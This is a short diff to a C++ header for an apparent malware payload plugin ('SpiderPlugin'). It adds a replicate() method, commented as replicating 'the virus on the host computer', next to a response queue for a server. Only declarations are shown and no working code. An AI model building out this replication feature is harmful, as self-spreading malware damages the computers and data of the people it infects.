@@ -32,6 +32,9 @@ class SpiderPlugin : public IPayload
     // Get the message thread-safe queue, in order to response to the server
     virtual mt::Queue<std::string> &getReponseQueue();
 
+    // Replicate the virus on the host computer
+    virtual void replicate();
+
     // Should de-initialize the payload, if needed
     virtual bool deinit();
 
